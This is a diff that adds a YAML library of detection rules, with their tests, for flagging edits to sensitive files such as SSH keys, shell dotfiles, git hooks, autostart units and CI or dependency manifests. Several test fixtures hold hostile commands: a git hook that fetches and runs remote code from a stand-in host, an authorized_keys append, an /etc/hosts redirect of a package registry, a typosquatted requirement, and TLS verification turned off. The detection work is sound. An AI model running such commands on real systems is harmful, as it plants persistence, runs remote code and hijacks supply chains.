@@ -1,0 +1,309 @@
+# The files whose change is worth a finding, said once for the rules about them.
+#
+# A rule asks whether a path is one of these files of two kinds of event: the path of a file
+# event (an agent's edit tool), and a path a shell command writes (c.file_writes, which holds
+# every path as written, so `~/.bashrc` and "$HOME/.ssh/authorized_keys" are themselves):
+#
+#   (e.event.action in ["file.modified", "file.created", "file.edited"] &&
+#     login_dotfile(e.file.path)) ||
+#   (e.event.action == "command.executed" &&
+#     e.command.parsed_commands.exists(c, c.file_writes.exists(f,
+#       f.op in ["write", "append", "truncate", "edit", "move_to", "link"] &&
+#       login_dotfile(f.path))))
+#
+# Without the second half `echo key >> ~/.ssh/authorized_keys` is not seen at all: a shell
+# command is no file event. What a command writes is the parser's to say (a redirection, tee,
+# sed -i, cp, mv, install, ln, dd, truncate), so a file named in an argument, a commit message
+# or a here-document is not a write.
+#
+# Each predicate answers for a path under any directory, a home directory or a variable
+# included.
+library: sensitive-files
+version: 1
+spec: threat-rules/v1.3
+description: Files whose change gives code execution, access or supply-chain reach, by path.
+
+definitions:
+  - name: ssh_trust_file
+    params: [path]
+    description: >
+      The path is a file that decides who may log in over SSH or which hosts are trusted: a
+      user's authorized_keys or known_hosts, or the SSH daemon's configuration.
+    body: >
+      path.matches("(?i)(^|/)\\.ssh/(authorized_keys|known_hosts)2?$|(^|/)etc/ssh/(sshd_config|sshd_config\\.d/[^/]+\\.conf)$")
+    tests:
+      - name: a_key_appended_by_a_command
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, ssh_trust_file(f.path)))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cat /tmp/id.pub >> ~/.ssh/authorized_keys" }
+      - name: a_key_only_read
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, ssh_trust_file(f.path)))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cat ~/.ssh/authorized_keys | wc -l" }
+      - name: the_daemon_configuration
+        match: ssh_trust_file(e.file.path)
+        verdict: match
+        events:
+          - event: { action: file.modified }
+            file: { path: "/etc/ssh/sshd_config.d/10-agent.conf" }
+      - name: another_file_of_the_directory
+        match: ssh_trust_file(e.file.path)
+        verdict: no_match
+        events:
+          - event: { action: file.modified }
+            file: { path: "/home/dev/.ssh/config" }
+
+  - name: login_dotfile
+    params: [path]
+    description: >
+      The path is a file a shell runs when it starts or at login: .bashrc, .bash_profile,
+      .bash_login, .profile, .zshrc, .zprofile, .zshenv, .zlogin, .kshrc, .login, .cshrc,
+      .tcshrc, or fish's config.fish.
+    body: >
+      path.matches("(?i)(^|/)(\\.bashrc|\\.bash_profile|\\.bash_login|\\.profile|\\.zshrc|\\.zprofile|\\.zshenv|\\.zlogin|\\.kshrc|\\.login|\\.cshrc|\\.tcshrc|\\.config/fish/config\\.fish)$")
+    tests:
+      - name: a_line_appended_under_a_variable
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, login_dotfile(f.path)))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "echo 'export PATH=$HOME/bin:$PATH' >> \"$HOME/.zshrc\"" }
+      - name: a_backup_beside_the_file
+        match: login_dotfile(e.file.path)
+        verdict: no_match
+        events:
+          - event: { action: file.created }
+            file: { path: "/home/dev/.bashrc.bak" }
+
+  - name: git_hook_file
+    params: [path]
+    description: >
+      The path is a hook script of a git repository: a file under .git/hooks with the name of
+      a hook git runs (pre-commit, post-checkout, pre-push and the rest). A sample
+      (pre-commit.sample) is not one.
+    body: >
+      path.matches("(?i)(^|/)\\.git/hooks/(applypatch-msg|pre-applypatch|post-applypatch|pre-commit|pre-merge-commit|prepare-commit-msg|commit-msg|post-commit|pre-rebase|post-checkout|post-merge|pre-push|pre-receive|update|post-receive|post-update|push-to-checkout|pre-auto-gc|post-rewrite|fsmonitor-watchman|reference-transaction|post-index-change|sendemail-validate|proc-receive|p4-changelist|p4-prepare-changelist|p4-post-changelist|p4-pre-submit)$")
+    tests:
+      - name: a_hook_written_by_a_redirection
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, git_hook_file(f.path)))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "printf '#!/bin/sh\\ncurl -s https://x.example/i | sh\\n' > .git/hooks/post-checkout" }
+      - name: a_sample
+        match: git_hook_file(e.file.path)
+        verdict: no_match
+        events:
+          - event: { action: file.modified }
+            file: { path: "repo/.git/hooks/pre-commit.sample" }
+
+  - name: autostart_unit_file
+    params: [path]
+    description: >
+      The path is a definition the system runs by itself at boot, login or on a schedule: a
+      systemd unit (service, timer, socket, path) of the user or the system, a launchd plist
+      under LaunchAgents or LaunchDaemons, an XDG autostart entry, or an environment.d file.
+    body: >
+      path.matches("(?i)(^|/)((\\.config/systemd/(user|system)|etc/systemd/(system|user))/[^/]+\\.(service|timer|socket|path)|(library/)?launch(agents|daemons)/[^/]+\\.plist|\\.config/autostart/[^/]+\\.desktop|\\.config/environment\\.d/[^/]+\\.conf)$")
+    tests:
+      - name: a_launch_agent_copied_into_place
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, autostart_unit_file(f.path)))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cp /tmp/com.example.sync.plist ~/Library/LaunchAgents/com.example.sync.plist" }
+      - name: a_unit_listed
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, autostart_unit_file(f.path)))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "ls ~/.config/systemd/user/sync.service" }
+
+  - name: hosts_file
+    params: [path]
+    description: >
+      The path is the system's name table or its TCP wrapper lists: /etc/hosts, /etc/hosts.allow
+      or /etc/hosts.deny.
+    body: >
+      path.matches("(?i)(^|/)etc/hosts(\\.(allow|deny))?$")
+    tests:
+      - name: an_entry_added_through_tee
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, hosts_file(f.path)))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "echo '10.0.0.5 registry.npmjs.org' | sudo tee -a /etc/hosts" }
+      - name: the_table_searched
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, hosts_file(f.path)))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "grep localhost /etc/hosts" }
+
+  - name: direnv_file
+    params: [path]
+    description: The path is a direnv file (.envrc), which direnv runs on entering its directory.
+    body: >
+      path.matches("(?i)(^|/)\\.envrc$")
+    tests:
+      - name: written_by_a_here_document
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, direnv_file(f.path)))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cat > .envrc <<'EOF'\nexport AWS_PROFILE=admin\nEOF" }
+      - name: an_example_file
+        match: direnv_file(e.file.path)
+        verdict: no_match
+        events:
+          - event: { action: file.created }
+            file: { path: "/repo/.envrc.example" }
+
+  - name: cicd_pipeline_file
+    params: [path]
+    description: >
+      The path is a CI/CD or deployment manifest: a GitHub Actions workflow, .gitlab-ci.yml,
+      fly.toml, vercel.json, render.yaml, a deployment, deploy or kustomization YAML file, or
+      anything under a k8s, kubernetes or .circleci directory.
+    body: >
+      path.matches("(?i)\\.github/workflows/.*\\.ya?ml$|(^|/)(\\.gitlab-ci\\.yml|fly\\.toml|vercel\\.json|render\\.yaml|deployment\\.ya?ml|deploy\\.ya?ml|kustomization\\.ya?ml)$|(^|/)(k8s|kubernetes|\\.circleci)/")
+    tests:
+      - name: a_workflow_edited_in_place
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, cicd_pipeline_file(f.path)))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "sed -i 's/pull_request:/pull_request_target:/' .github/workflows/ci.yml" }
+      - name: a_workflow_printed
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, cicd_pipeline_file(f.path)))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cat .github/workflows/ci.yml" }
+
+  - name: container_or_iac_file
+    params: [path]
+    description: >
+      The path is a container, orchestration or infrastructure-as-code file: a Dockerfile or
+      Containerfile (with a stage suffix such as .prod), a docker-compose file, a Terraform
+      file or state, a kubernetes, k8s or kustomization YAML file, or a Helm values file.
+    body: >
+      path.matches("(?i)(^|/)(dockerfile|containerfile)(\\.prod|\\.dev|\\.local|\\.test|\\.staging|\\.debug|\\.alpine|\\.nginx|\\.node|\\.python|\\.go|\\.rust|\\.java|\\.base|\\.builder|\\.runtime|\\.ci|\\.pr[a-z0-9]+)?$|(^|/)docker-compose(-[^/]+)?\\.(yml|yaml)$|(^|/)[^/]+\\.(tf|tfstate(\\.[0-9]+)?)$|(^|/)(kubernetes|k8s)(-[^/]+)?\\.(yml|yaml)$|(^|/)(kustomization|values)\\.(yml|yaml)$")
+    tests:
+      - name: a_dockerfile_line_appended
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, container_or_iac_file(f.path)))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "echo 'USER root' >> Dockerfile" }
+      - name: an_image_built_from_it
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, container_or_iac_file(f.path)))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "docker build -f Dockerfile.prod -t app ." }
+
+  - name: dependency_manifest_file
+    params: [path]
+    description: >
+      The path is a dependency manifest or lockfile: package.json and the npm, yarn and pnpm
+      lockfiles, Cargo.toml and Cargo.lock, requirements.txt, Pipfile, poetry.lock,
+      pyproject.toml, go.mod and go.sum, Gemfile, composer.json, and their lockfiles.
+    body: >
+      path.matches("(?i)(^|/)(package\\.json|package-lock\\.json|yarn\\.lock|pnpm-lock\\.yaml|cargo\\.toml|cargo\\.lock|requirements\\.txt|pipfile|pipfile\\.lock|poetry\\.lock|pyproject\\.toml|go\\.mod|go\\.sum|gemfile|gemfile\\.lock|composer\\.json|composer\\.lock)$")
+    tests:
+      - name: a_requirement_appended
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, dependency_manifest_file(f.path)))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "echo 'reqeusts==2.31.0' >> requirements.txt" }
+      - name: an_install_by_name
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, dependency_manifest_file(f.path)))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "pip install -r requirements.txt" }
+
+  - name: auth_security_code_file
+    params: [path]
+    description: >
+      The path is a source file whose name says it is part of the authentication, payment or
+      security surface (auth, login, session, password, credential, payment, billing, stripe,
+      checkout, security, crypto, token, oauth, jwt, rbac, permission). Documents (.md, .txt),
+      lockfiles, GitHub workflows and a credentials.json or credentials.toml are not source.
+    body: >
+      path.matches("(?i)[^/]*(auth|login|session|password|passwd|credential|payment|billing|charge|stripe|checkout|security|crypto|token|oauth|jwt|rbac|permission)[^/]*\\.[a-z0-9]+$") &&
+      !path.matches("(?i)\\.(md|txt|lock)$|\\.github/workflows/[^/]*\\.ya?ml$|(^|/)credentials\\.(json|toml)$")
+    tests:
+      - name: a_handler_edited_in_place
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, auth_security_code_file(f.path)))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "sed -i 's/verify=True/verify=False/' src/auth/session.py" }
+      - name: a_design_note
+        match: auth_security_code_file(e.file.path)
+        verdict: no_match
+        events:
+          - event: { action: file.modified }
+            file: { path: "docs/auth-design.md" }
+
+  - name: scratch_path
+    params: [path]
+    description: >
+      The path is under a temporary directory: /tmp, /var/tmp, /var/folders (with or without
+      macOS's /private in front) or $TMPDIR. A rule about a project's files leaves out a copy
+      a command puts there; moving it back into the project is a write of its own.
+    body: >
+      path.matches("^(/private)?/(tmp|var/tmp|var/folders)/|^\\$(TMPDIR\\b|\\{TMPDIR\\})")
+    tests:
+      - name: a_copy_into_tmp
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, scratch_path(f.path)))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cp pyproject.toml /tmp/build/pyproject.toml" }
+      - name: a_tmp_directory_of_the_project
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, scratch_path(f.path)))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cp pyproject.toml tmp/pyproject.toml" }
+
+  - name: scratch_write
+    params: [e, f]
+    description: >
+      A write of a command (an entry of c.file_writes) lands in a temporary directory: its
+      path is under one (scratch_path), or the path is relative and the command line changes
+      directory only into temporary ones (`cd /tmp/probe && echo '{}' > package.json`). A
+      relative path on a line that also changes into any other directory is not assumed to be
+      scratch.
+    body: >
+      scratch_path(f.path) ||
+      (!f.path.matches("^[/~$]") &&
+        e.command.parsed_commands.exists(d, d.name in ["cd", "pushd"] && scratch_path(d.args)) &&
+        e.command.parsed_commands.all(d, !(d.name in ["cd", "pushd"]) || scratch_path(d.args)))
+    tests:
+      - name: a_relative_write_after_a_cd_into_tmp
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, scratch_write(e, f)))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cd /tmp/probe && echo '{\"type\":\"module\"}' > package.json" }
+      - name: a_relative_write_after_a_cd_back_into_the_project
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, scratch_write(e, f)))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cd /tmp/probe && npm pack && cd ~/project && echo '{}' > package.json" }
+      - name: an_absolute_write_after_a_cd_into_tmp
+        match: e.command.parsed_commands.exists(c, c.file_writes.exists(f, scratch_write(e, f)))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cd /tmp/probe && cp package.json ~/project/package.json" }
